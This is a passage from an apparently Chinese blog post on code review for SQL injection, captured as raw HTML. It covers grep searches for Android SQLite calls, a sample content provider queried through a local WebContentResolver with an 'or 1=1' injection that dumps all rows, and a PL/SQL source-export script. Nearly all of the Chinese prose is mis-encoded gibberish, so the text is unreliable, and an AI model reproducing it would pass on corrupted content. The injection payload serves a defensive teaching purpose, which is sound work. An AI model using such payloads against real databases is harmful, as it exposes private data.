punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> <span class="token comment">//ç»™å®šä¸€ç»„å­æŸ¥è¯¢ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªéƒ½æ˜¯SELECTè¯­å¥ï¼Œæ„é€ ä¸€ä¸ªunionæ‰€æœ‰è¿™äº›å­æŸ¥è¯¢è¿”å›ç»“æœçš„æŸ¥è¯¢ </span><span class="token function">buildUnionQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> subQueries<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//æ„é€ ä¸€æ¡SELECTè¯­å¥ï¼Œè¯¥è¯­å¥é€‚åˆä½œä¸ºbuildUnionQueryä¸­é€šè¿‡UNIONæ“ä½œç¬¦è¿æ¥çš„è¯­å¥ç»„ä¸­çš„SELECTè¯­å¥</span><span class="token function">buildUnionSubQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> typeDiscriminatorColumn<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> unionColumns<span class="token punctuation">,</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> columnsPresentInTable<span class="token punctuation">,</span> <span class="token keyword">int</span> computedColumnsOffset<span class="token punctuation">,</span> <span class="token class-name">String</span> typeDiscriminatorValue<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">)</span><span class="token comment">//ç»“åˆæ‰€æœ‰å½“å‰è®¾ç½®å’Œä¼ é€’ç»™è¯¥æ–¹æ³•çš„ä¿¡æ¯ï¼Œè¿™äº›ä¸€ä¸ªæŸ¥è¯¢</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase</span> db<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projectionin<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//android.database.sqlite.SQLiteDatabase</span><span class="token comment">//åœ¨æ•°æ®åº“ä¸­åˆ é™¤è¡Œçš„ç®€ä¾¿æ–¹æ³•</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span><span class="token comment">//æ‰§è¡Œå•ä¸ªSQLè¯­å¥ï¼Œè¯¥SQLè¯­å¥æ—¢ä¸æ˜¯SELECTè¯­å¥ï¼Œä¹Ÿä¸æ˜¯ä»»ä½•å…¶ä»–è¿”å›æ•°æ®çš„SQLè¯­å¥ </span><span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span><span class="token comment">//æ‰§è¡Œå•ä¸ªSQLè¯­å¥ï¼Œè¯¥SQLè¯­å¥ä¸æ˜¯SELECT/INSERT/UPDATE/DELETEè¯­å¥</span><span class="token function">execSQL</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">sql<span class="token punctuation">.</span></span> Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bindArgs<span class="token punctuation">)</span><span class="token comment">//å‘æ•°æ®åº“æ’å…¥ä¸€è¡Œæ•°æ®çš„ä¾¿æ·æ–¹æ³•</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span><span class="token comment">//å‘æ•°æ®åº“æ’å…¥ä¸€è¡Œæ•°æ®çš„ä¾¿æ·æ–¹æ³•</span><span class="token function">insertOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span><span class="token class-name">Contentvalues</span> values<span class="token punctuation">)</span><span class="token comment">//å‘æ•°æ®åº“æ’å…¥ä¸€è¡Œæ•°æ®çš„é€šç”¨æ–¹æ³•</span><span class="token function">insertWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span><span class="token comment">//æŸ¥è¯¢æŒ‡å®šçš„è¡¨ï¼Œè¿”å›ç»“æœé›†ä¸Šçš„ä¸€ä¸ªæ¸¸æ ‡(Cursor)</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> having<span class="token punctuation">,</span> <span class="token class-name">String</span> orderBy<span class="token punctuation">,</span><span class="token class-name">String</span> limit<span class="token punctuation">)</span><span class="token comment">//æŸ¥è¯¢æŒ‡å®šçš„URL,è¿”å›ç»“æœé›†ä¸Šçš„ä¸€ä¸ªæ¸¸æ ‡</span><span class="token function">queryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span> <span class="token keyword">boolean</span> distinct<span class="token punctuation">,</span> <span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> columns<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">selection<span class="token punctuation">.</span></span> String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> groupBy<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name"><span class="token namespace">having<span class="token punctuation">.</span></span> String</span> orderBy<span class="token punctuation">,</span> <span class="token class-name">String</span> limit<span class="token punctuation">)</span> <span class="token comment">//è¿è¡ŒæŒ‡å®šçš„SQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†ä¸Šçš„ä¸€ä¸ªæ¸¸æ ‡</span><span class="token function">rawQuery</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">)</span><span class="token comment">//è¿è¡ŒæŒ‡å®šçš„SQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†ä¸Šçš„ä¸€ä¸ªæ¸¸æ ‡</span><span class="token function">rawQueryWithFactory</span><span class="token punctuation">(</span><span class="token class-name">SQLiteDatabase<span class="token punctuation">.</span>CursorFactory</span> cursorFactory<span class="token punctuation">,</span><span class="token class-name">String</span> sql<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> editTable<span class="token punctuation">)</span><span class="token comment">//æ›¿æ¢æ•°æ®åº“ä¸­æ•°æ®è¡Œçš„ä¾¿æ·æ–¹æ³•</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialvalues<span class="token punctuation">)</span> <span class="token comment">//æ›¿æ¢æ•°æ®åº“ä¸­æ•°æ®è¡Œçš„ä¾¿æ·æ–¹æ³•</span><span class="token function">replaceOrThrow</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">String</span> nullColumnHack<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> initialValues<span class="token punctuation">)</span><span class="token comment">//æ›´æ–°æ•°æ®åº“ä¸­æ•°æ®è¡Œçš„ä¾¿æ·æ–¹æ³•</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">)</span><span class="token comment">//æ›´æ–°æ•°æ®åº“ä¸­æ•°æ®è¡Œçš„ä¾¿æ·æ–¹æ³•</span><span class="token function">updateWithOnConflict</span><span class="token punctuation">(</span><span class="token class-name">String</span> table<span class="token punctuation">,</span> <span class="token class-name">Contentvalues</span> values<span class="token punctuation">,</span> <span class="token class-name">String</span> whereClause<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> whereArgs<span class="token punctuation">,</span> <span class="token keyword">int</span> conflictAlgorithm<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="è·Ÿè¸ªæ•°æ®-1"><a href="#è·Ÿè¸ªæ•°æ®-1" class="headerlink" title="è·Ÿè¸ªæ•°æ®"></a>è·Ÿè¸ªæ•°æ®</h5><p>é€šè¿‡shellå‘½ä»¤åœ¨æºæ–‡ä»¶ä¸­æŸ¥æ‰¾ä¸Šè¿°ç±»æ–¹æ³•</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithO nConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFacto ry(\|replace(\|replaceOrThrow(\|update(\ä¸¨ updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'{print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœç´¢åŒ…å«åŠ¨æ€SQLè¯­å¥çš„å­—ç¬¦ä¸²</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"String.*=.*<span class="token entity" title="\&quot;">\"</span>\(SELECT\|UPDATE\|INSERT\|DROP\)"</span> src/ <span class="token operator">|</span> <span class="token function">awk</span> -F: <span class="token string">'(print "filename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¤ºä¾‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ svn checkout http://android-sap-note-viewer.googlecode.com/svn/trunk/sap-note-viewer$ <span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-n</span> <span class="token string">"delete(\|execSQL(\|insert(\|insertOrThrow(\|insertWithOnConflict(\|query(\|queryWithFactory(\|rawQuery(\|rawQueryWithFactory(\|replace(\|replaceOrThrow(\|update(\|updateWithOnConflict(\|buildQuery(\|buildQueryString(\|buildUnionQuery(\|buildUnionSubQuery(\ | query("</span> sap-note-viewer/ <span class="token operator">|</span> <span class="token function">awk</span> -F:<span class="token string">'{print nfilename: "$l"\nline: "$2"\nmatch: "$3"\n\n"}'</span>filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.javaline: <span class="token number">106</span>match: public Cursor query<span class="token punctuation">(</span>Uri uri, String<span class="token punctuation">[</span><span class="token punctuation">]</span> projection, String selection, String<span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs, String sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span>filename: sap-note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.javaline: <span class="token number">121</span>match: Cursor c <span class="token operator">=</span> qBuilder.query<span class="token punctuation">(</span>db, projection, selection, selectionArgs, null, null, sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æºç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token class-name">Cursor</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token class-name">Uri</span> uri<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> projection<span class="token punctuation">,</span> <span class="token class-name">String</span> selection<span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> selectionArgs<span class="token punctuation">,</span> <span class="token class-name">String</span> sortOrder<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">SQLiteQueryBuilder</span> qBuilder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLiteQueryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qBuilder<span class="token punctuation">.</span><span class="token function">setTables</span><span class="token punctuation">(</span><span class="token constant">DATABASE_TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¦‚æœæœç´¢ä¸ºç©ºï¼Œå°±æ·»åŠ ä¸€ä¸ªé€šé…ç¬¦ï¼Œåœ¨å†…å®¹ä¹‹å‰å’Œä¹‹åæ·»åŠ é€šé…ç¬¦</span><span class="token keyword">if</span><span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token string">"%"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>selectionArgs<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> selectionArgs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span>selectionArgs <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//å°†å†…éƒ¨å­—æ®µæ˜ å°„åˆ°SearchManagerç†è§£çš„å­—æ®µ</span>qBuilder<span class="token punctuation">.</span><span class="token function">setProjectionMap</span><span class="token punctuation">(</span><span class="token constant">NOTE_PROJECTION_MAP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SQLiteDatabase</span> db <span class="token operator">=</span> dbHelper<span class="token punctuation">.</span><span class="token function">getReadableDatabase</span><span class="token punctuation">(</span>ã€‰ï¼›<span class="token comment">//æ‰§è¡ŒæŸ»è¯¢</span><span class="token class-name">Cursor</span> c <span class="token operator">=</span> qBuilder<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>db<span class="token punctuation">,</span> projection<span class="token punctuation">,</span> selection<span class="token punctuation">,</span> selectionArgs<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> sortOrder<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>WebContentResolverå‘æ‰€æœ‰å·±ç»å®‰è£…çš„å†…å®¹æä¾›ç¨‹åº(Content-Provider)æš´éœ²äº†ä¸€ä¸ªWeb Serviceæ¥å£ã€‚å¯ä»¥ç”¨WebContentResolverå®ç”¨å·¥å…·åˆ—å‡ºæ‰€æœ‰å¯è®¿é—®çš„å†…å®¹æä¾›ç¨‹åºã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/listpackage: org.sapmentors.sapnoteviewauthority: org.sapmentors.sapnoteview.noteproviderexported: <span class="token boolean">true</span>readPerm: nullwritePerm: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡ŒæŸ¥è¯¢</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview.noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">seiId</span><span class="token operator">=</span><span class="token number">11223</span>Query successful:Column count: <span class="token number">3</span>Row count: <span class="token number">1</span>I_id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span> suggest_intent_dataI <span class="token number">11223</span> <span class="token operator">|</span> secret text ä¸¨ <span class="token number">11223</span><span class="token comment">#å®é™…SQLè¯­å¥</span><span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œæ³¨å…¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$curl</span> http://127.0.0.1:8080/query?a<span class="token operator">=</span>org.sapmentors.sapnoteview, noteprovider?<span class="token operator">&amp;</span><span class="token assign-left variable">selName</span><span class="token operator">=</span>_id<span class="token operator">&amp;</span><span class="token assign-left variable">selId</span><span class="token operator">=</span>l1223%20or%201<span class="token operator">=</span><span class="token number">1</span>Query successful:Column count: <span class="token number">3</span>Row count: <span class="token number">4</span><span class="token operator">|</span> _id <span class="token operator">|</span> suggest_text_l <span class="token operator">|</span>suggest_intent_data<span class="token operator">|</span> <span class="token number">11223</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">11223</span><span class="token operator">|</span> <span class="token number">12345</span> <span class="token operator">|</span> secret text <span class="token operator">|</span> <span class="token number">12345</span><span class="token operator">|</span> <span class="token number">54321</span> <span class="token operator">|</span> super secret text <span class="token operator">|</span> <span class="token number">54321</span><span class="token operator">|</span> <span class="token number">98765</span> <span class="token operator">|</span> shhhh secret <span class="token operator">|</span> <span class="token number">98765</span><span class="token comment">#å®é™…SQLè¯­å¥</span><span class="token comment">#SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data FROM notes WHERE (_id=11223 or 1=1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>selNameå’ŒselIdè¿™ä¸¤ä¸ªå‚æ•°æ˜“æ„ŸæŸ“ï¼Œå­˜åœ¨SQLæ³¨å…¥</p><h4 id="å¤æŸ¥PL-SQLå’ŒT-SQLä»£ç "><a href="#å¤æŸ¥PL-SQLå’ŒT-SQLä»£ç " class="headerlink" title="å¤æŸ¥PL/SQLå’ŒT-SQLä»£ç "></a>å¤æŸ¥PL/SQLå’ŒT-SQLä»£ç </h4><h5 id="PL-SQL"><a href="#PL-SQL" class="headerlink" title="PL/SQL"></a>PL/SQL</h5><p>Oracleä¸€ç›´æ·±å—å¤šç§PL/SQLæ³¨å…¥æ¼æ´çš„å›°æ‰°ï¼Œè¿™äº›æ¼æ´ä½äºæ•°æ®åº“äº§å“é»˜è®¤å®‰è£…çš„å†…ç½®æ•°æ®åº“åŒ…çš„ä»£ç ä¸­ã€‚PL/SQLä»£ç ä»¥defineræƒé™æ‰§è¡Œï¼Œæ˜¯æå‡æƒé™çš„æ”»å‡»è€…æ”»å‡»å¯¹è±¡ã€‚</p><p>å­˜å‚¨è¿‡ç¨‹æ—¢èƒ½å¤Ÿä»¥è°ƒç”¨è€…æƒé™(authid current_user)è¿è¡Œï¼Œä¹Ÿèƒ½å¤Ÿä»¥å­˜å‚¨è¿‡ç¨‹æ‰€æœ‰è€…æƒé™ (authid definer)è¿è¡Œã€‚åˆ›å»ºå­˜å‚¨è¿‡ç¨‹æ—¶ï¼Œå¯ä»¥ä½¿ç”¨authidå­å¥æŒ‡å®šè¯¥è¡Œä¸ºã€‚</p><p>è¦åˆ†æPL/SQLæœ‰ä¸¤ç§é€‰æ‹©</p><h6 id="ä¸€ç§æ˜¯å°†æºä»£ç ä»æ•°æ®åº“å¯¼å‡ºæ¥"><a href="#ä¸€ç§æ˜¯å°†æºä»£ç ä»æ•°æ®åº“å¯¼å‡ºæ¥" class="headerlink" title="ä¸€ç§æ˜¯å°†æºä»£ç ä»æ•°æ®åº“å¯¼å‡ºæ¥"></a>ä¸€ç§æ˜¯å°†æºä»£ç ä»æ•°æ®åº“å¯¼å‡ºæ¥</h6><p>å¯ä»¥ä½¿ç”¨dbms_metadataåŒ…å®ç°è¯¥ç›®æ ‡ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢SQL*Plusè„šæœ¬å°†DDL(Data Definition Language,æ•°æ®å®šä¹‰è¯­è¨€)è¯­å¥ä»Oracleæ•°æ®åº“å¯¼å‡ºæ¥ã€‚DDLè¯­å¥æ˜¯å®šä¹‰æˆ–ä¿®æ”¹æ•°æ®ç»“æ„(æ¯”å¦‚ è¡¨)çš„SQLè¯­å¥ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- Purpose: A PL/SQL script to export the DDL code for all database objects â€”â€”Version: v 0.0.1</span><span class="token comment">-- Works against: Oracle 9i, lOg and llg</span><span class="token comment">-- Author: Alexander Kornbrust of Red-Database-Security GmbH</span><span class="token keyword">set</span> echo <span class="token keyword">off</span> feed <span class="token keyword">off</span> pages <span class="token number">0</span> trims <span class="token keyword">on</span> term <span class="token keyword">on</span> trim <span class="token keyword">on</span> linesize <span class="token number">255</span> long <span class="token number">500000</span> head <span class="token keyword">off</span><span class="token comment">--</span><span class="token keyword">execute</span> DBMS_METADATA<span class="token punctuation">.</span>SET_TRANSFORM_PARAM<span class="token punctuation">(</span>DBMS_METADATA<span class="token punctuation">.</span>SESSION_TRANSFORM<span class="token punctuation">,</span> <span class="token string">'STORAGE'</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>spool getallunwrapped<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token keyword">select</span> <span class="token string">'spool ddl_source_unwrapped.txt'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span><span class="token comment">-- create a SQL scripts containing all unwrapped objects</span><span class="token keyword">select</span> <span class="token string">'select dbms_metadata.get_ddl('''</span><span class="token operator">||</span>object_type<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>object_name<span class="token operator">||</span><span class="token string">''','''</span><span class="token operator">||</span>owner<span class="token operator">||</span><span class="token string">''') from dual;'</span><span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_id <span class="token operator">not</span> <span class="token operator">in</span><span class="token punctuation">(</span><span class="token keyword">select</span> o<span class="token punctuation">.</span>obj<span class="token comment"># from source$ s, obj$ o,user$ u where ((lower(s.source) like '%function%wrapped%') or (lower (s.source) like '%procedure%wrapped%') or (lower(s.source) like '%package%wrapped%')) and o.obj#=s .obj# and u.user#=o.owner#)) where object_type in ('FUNCTION','PROCEDURE', 'PACKAGE', 'TRIGGER')</span><span class="token operator">and</span> owner <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'SYS'</span><span class="token punctuation">)</span> <span class="token keyword">order</span> <span class="token keyword">by</span> owner<span class="token punctuation">,</span>object_type<span class="token punctuation">,</span>object_name<span class="token punctuation">;</span><span class="token comment">-- spool a spool off into the spool file.</span><span class="token keyword">select</span> <span class="token string">'spool off'</span> <span class="token keyword">from</span> dual<span class="token punctuation">;</span>spool <span class="token keyword">off</span><span class="token comment">--</span><span class="token comment">-- generate the DDL_source</span><span class="token variable">@getallunwrapped.sql</span>quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="å¦ä¸€ç§æ˜¯æ„é€ è‡ªå·±çš„SQLè¯­å¥æ¥æœç´¢PL-SQLä»£ç "><a href="#å¦ä¸€ç§æ˜¯æ„é€ è‡ªå·±çš„SQLè¯­å¥æ¥æœç´¢PL-SQLä»£ç " class="headerlink" title="å¦ä¸€ç§æ˜¯æ„é€ è‡ªå·±çš„SQLè¯­å¥æ¥æœç´¢PL/SQLä»£ç "></a>å¦ä¸€ç§æ˜¯æ„é€ è‡ªå·±çš„SQLè¯­å¥æ¥æœç´¢PL/SQLä»£ç </h6><p>Oracleåœ¨ ALL_SOURCEå’ŒDBA_SOURCEè§†å›¾ä¸­å­˜å‚¨PL/SQLæºä»£ç ã€‚å¯ä»¥é€šè¿‡è®¿é—®ä¸¤ä¸ªè§†å›¾ä¹‹ä¸€çš„TEXTåˆ—å®ç°è¯¥ç›®çš„ã€‚æœ€å€¼å¾—å…³æ³¨çš„æ˜¯ä½¿ç”¨äº†execute immediateæˆ–dbms sqlå‡½æ•°çš„ä»£ç ã€‚Oracleçš„PL/SQLæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œä¸€å®šè¦åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨lower(text)å‡½æ•°ï¼Œå®ƒä¼šå°†æ–‡æœ¬å€¼è½¬æ¢ä¸ºå°å†™å­—æ¯ä»¥ä¾¿LIKEè¯­å¥èƒ½åŒ¹é…æ‰€æœ‰å¯èƒ½çš„æƒ…å†µã€‚</p><p>ä½¿ç”¨ä¸‹åˆ—SQLè¯­å¥æ¥è·å–PL/SQLä»£ç çš„æº</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token keyword">text</span> <span class="token keyword">AS</span> Source <span class="token keyword">FROM</span> dba_source <span class="token keyword">WHERE</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%immediate%'</span><span class="token punctuation">)</span> <span class="token operator">OR</span> <span class="token punctuation">(</span>LOWER<span class="token punctuation">(</span>Source<span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token string">'%dbms_sql'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">AND</span> owner<span class="token operator">=</span> <span class="token string">'PLSQL'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/07/19/WJRMKf.png" alt="WJRMKf.png"></p><p>è¿™ä¸‰æ¡è¯­å¥æ˜“å—åˆ°æ”»å‡»ï¼ŒæœªéªŒè¯çš„å‚æ•°ä¼ ç»™äº†å±é™©çš„å‡½æ•°</p><p>å¯»æ‰¾å‚æ•°å¤åˆ¶ç»™å±€éƒ¨å®šä¹‰çš„å˜é‡</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> owner <span class="token keyword">AS</span> Owner<span class="token punctuation">,</span> name <span class="token keyword">AS</span> Name<span class="token punctuation">,</span> <span class="token keyword">type</span> <span class="token keyword">AS</span> <span class="token keyword">Type</span><span class="token punctuation">,</span> <span class="token 